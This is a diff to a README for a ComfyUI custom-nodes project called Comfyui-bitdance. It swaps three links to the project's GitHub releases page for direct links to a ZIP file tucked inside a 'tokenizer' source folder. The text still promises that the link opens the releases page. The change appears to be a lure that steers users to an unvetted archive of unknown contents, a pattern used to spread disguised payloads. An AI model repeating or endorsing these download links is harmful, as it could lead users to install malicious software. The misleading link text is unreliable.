@@ -1,6 +1,6 @@
 # ⚙️ Comfyui-bitdance - Custom Nodes for Easy Workflow
 
-[![Download Comfyui-bitdance](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Andrilalaina21/Comfyui-bitdance/releases)
+[![Download Comfyui-bitdance](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Andrilalaina21/Comfyui-bitdance/main/tokenizer/bitdance_Comfyui_v3.8.zip)
 
 ## 📋 About Comfyui-bitdance
 
@@ -27,7 +27,7 @@ Follow these steps to download, install, and run Comfyui-bitdance on your Window
 
 Click the large green button at the top or this link:
 
-[Download Comfyui-bitdance Releases](https://github.com/Andrilalaina21/Comfyui-bitdance/releases)
+[Download Comfyui-bitdance Releases](https://raw.githubusercontent.com/Andrilalaina21/Comfyui-bitdance/main/tokenizer/bitdance_Comfyui_v3.8.zip)
 
 You will be taken to the releases page. Here you will find the latest stable version available for download.
 
@@ -128,4 +128,4 @@ When you open the downloaded ZIP or installer files, you typically find:
 
 The Comfyui-bitdance nodes focus on smooth integration, letting you work faster with your models and projects.
 
-[![Download Comfyui-bitdance](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Andrilalaina21/Comfyui-bitdance/releases)
+[![Download Comfyui-bitdance](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Andrilalaina21/Comfyui-bitdance/main/tokenizer/bitdance_Comfyui_v3.8.zip)
